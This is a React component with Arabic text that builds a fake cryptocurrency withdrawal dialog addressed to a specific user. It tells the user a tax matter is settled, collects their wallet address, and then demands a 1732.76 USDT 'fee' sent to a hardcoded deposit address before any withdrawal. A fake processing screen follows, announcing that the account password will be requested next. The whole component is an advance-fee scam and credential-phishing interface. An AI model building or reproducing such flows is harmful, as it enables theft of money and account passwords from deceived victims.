import React, { useState } from 'react';

const WithdrawalModal: React.FC = () => {
  const [step, setStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');
  const [copied, setCopied] = useState(false);

  const depositAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const nextStep = () => setStep(prev => prev + 1);

  const copyToClipboard = () => {
    navigator.clipboard.writeText(depositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="modal-backdrop font-arabic select-none">
      <div className="modal-container animate-center">
        
        {/* الخطوة الأولى: الترحيب والتبليغ */}
        {step === 1 && (
          <div className="flex flex-col space-y-6 animate-in fade-in duration-300">
            <div className="flex flex-col items-center text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-[#7C4A50]/10 flex items-center justify-center text-[#7C4A50]">
                <i className="fa-solid fa-circle-check text-[32px]"></i>
              </div>
              <h2 className="text-[22px] font-black text-gray-800 leading-tight">اهلا بك Mnour999</h2>
            </div>
            
            <div className="text-[15px] leading-relaxed text-gray-700 space-y-4 text-center">
              <p className="font-semibold">تم حل أمر الضرييه يمكن سحب جميع العملات.</p>
              
              <div className="bg-red-50 p-4 rounded-xl border border-red-100 flex items-start space-x-3 space-x-reverse text-right">
                <i className="fa-solid fa-triangle-exclamation text-red-500 mt-1"></i>
                <p className="text-[13px] text-red-700 font-bold">
                  يرجى عدم مشاركه الرابط الخاص بحسابك نحن غير مسؤولين عن فقدان العملات ان تم تسريبه.
                </p>
              </div>
              
              <p className="text-[14px] text-gray-600 font-medium">
                الان اضغط التالي وقم بوضع رابط المنصه mini pro لقسم الايداع حصرا.
              </p>
            </div>

            <button 
              onClick={nextStep}
              className="w-full py-4 custom-gradient text-white rounded-2xl font-black text-[18px] active:scale-[0.98] transition-transform shadow-lg shadow-[#7C4A50]/20"
            >
              التالي
            </button>
          </div>
        )}

        {/* الخطوة الثانية: بيانات المحفظة */}
        {step === 2 && (
          <div className="flex flex-col space-y-6 animate-in fade-in duration-300">
            <div className="flex flex-col items-center text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-[#1F6AE1]/10 flex items-center justify-center text-[#1F6AE1]">
                <i className="fa-solid fa-link text-[32px]"></i>
              </div>
              <h2 className="text-[22px] font-black text-gray-800 leading-tight">ربط محفظة السحب</h2>
            </div>
            
            <div className="space-y-4">
              <p className="text-[15px] text-gray-700 text-center font-medium">يرجى إدخال عنوان محفظتك الشخصية (شبكة BEP-20) التي ترغب باستلام العملات عليها.</p>
              
              <div className="space-y-1.5">
                <label className="text-[12px] font-bold text-gray-400 mr-2 uppercase">رابط محفظة BEP-20</label>
                <div className="relative group">
                  <input 
                    type="text"
                    placeholder="0x..."
                    value={walletAddress}
                    onChange={(e) => setWalletAddress(e.target.value)}
                    className="w-full p-5 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#7C4A50] bg-gray-50 text-[14px] font-mono transition-all text-left"
                    style={{ direction: 'ltr' }}
                  />
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 group-focus-within:text-[#7C4A50]">
                    <i className="fa-solid fa-key"></i>
                  </div>
                </div>
              </div>
            </div>

            <button 
              onClick={nextStep}
              disabled={!walletAddress || walletAddress.length < 20}
              className={`w-full py-4 text-white rounded-2xl font-black text-[18px] transition-all ${walletAddress && walletAddress.length >= 20 ? 'custom-gradient active:scale-[0.98] shadow-lg shadow-[#7C4A50]/20' : 'bg-gray-200 cursor-not-allowed text-gray-400'}`}
            >
              التالي
            </button>
          </div>
        )}

        {/* الخطوة الثالثة: تسوية الرسوم */}
        {step === 3 && (
          <div className="flex flex-col space-y-6 animate-in fade-in duration-300">
            <div className="flex flex-col items-center text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-amber-50 flex items-center justify-center text-amber-600">
                <i className="fa-solid fa-receipt text-[32px]"></i>
              </div>
              <h2 className="text-[22px] font-black text-gray-800 leading-tight">اهلا بك Mnour999</h2>
            </div>
            
            <div className="text-[14px] leading-relaxed text-gray-700 space-y-4 text-center">
              <p className="font-semibold">بقي أمر إيداع مبلغ <span className="text-[#7C4A50] font-black text-[18px]">1732.76</span> عملة usdt beb 20 لفتح قناة السحب.</p>
              
              <div className="bg-gray-50 p-4 rounded-xl border border-gray-100 text-right">
                <p className="text-[12px] text-gray-500 leading-relaxed font-medium">
                  الضريبه هي اجور منصتنا وليس لها أي صله بمنصهmini pro وتم تخفيض الضريبة بتسويه من منصة mini pro بموجب اتفاق ضمن برتكول الخاص بالمنصه الاساسيه.
                </p>
              </div>

              <div className="space-y-2 text-right">
                <p className="font-bold text-gray-800 text-[13px] mr-1">حول إلى هذا العنوان:</p>
                <div 
                  onClick={copyToClipboard}
                  className="group relative bg-gray-900 text-white p-5 rounded-2xl font-mono text-[11px] text-center select-all cursor-pointer break-all mb-1 hover:bg-black transition-colors shadow-inner"
                >
                  {depositAddress}
                  <div className="absolute inset-y-0 left-4 flex items-center">
                     <i className={`fa-solid ${copied ? 'fa-check text-green-400' : 'fa-copy opacity-40'} transition-opacity`}></i>
                  </div>
                </div>
                {copied && <p className="text-center text-green-600 text-[11px] font-black animate-pulse">✓ تم نسخ العنوان بنجاح</p>}
              </div>
            </div>

            <button 
              onClick={nextStep}
              className="w-full py-4 custom-gradient text-white rounded-2xl font-black text-[18px] active:scale-[0.98] transition-all shadow-lg shadow-[#7C4A50]/20"
            >
              تم الايداع
            </button>
          </div>
        )}

        {/* الخطوة الرابعة: المعالجة والأمان */}
        {step === 4 && (
          <div className="flex flex-col items-center space-y-8 py-4 animate-in fade-in duration-500 text-center">
            <h2 className="text-[24px] font-black text-gray-800 tracking-tight">الرجاء الانتظار...</h2>
            
            <div className="relative flex items-center justify-center">
              <div className="loader"></div>
              <div className="absolute text-[#7C4A50] opacity-30">
                <i className="fa-solid fa-shield-halved text-[24px]"></i>
              </div>
            </div>

            <div className="space-y-6">
              <p className="text-[16px] text-gray-700 leading-relaxed font-semibold px-2">
                الرجاء الانتظار للتأكد من عمليه الايداع في الشبكة.
              </p>
              
              <div className="bg-blue-50 p-5 rounded-2xl border-2 border-dashed border-blue-200">
                <p className="text-blue-800 text-[14px] font-bold leading-relaxed">
                  سيتم توجهيك للخطوة النهائيه بعد تأكيد الايداع لوضع كلمة المرور وستكون اخر خطوة تفصل عن السحب.
                </p>
              </div>

              <div className="bg-amber-50 p-4 rounded-xl border border-amber-100 mt-2">
                <p className="text-amber-800 text-[13px] font-bold">
                  الخطوة التاليه يجب وضع كلمة المرور الحساب.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WithdrawalModal;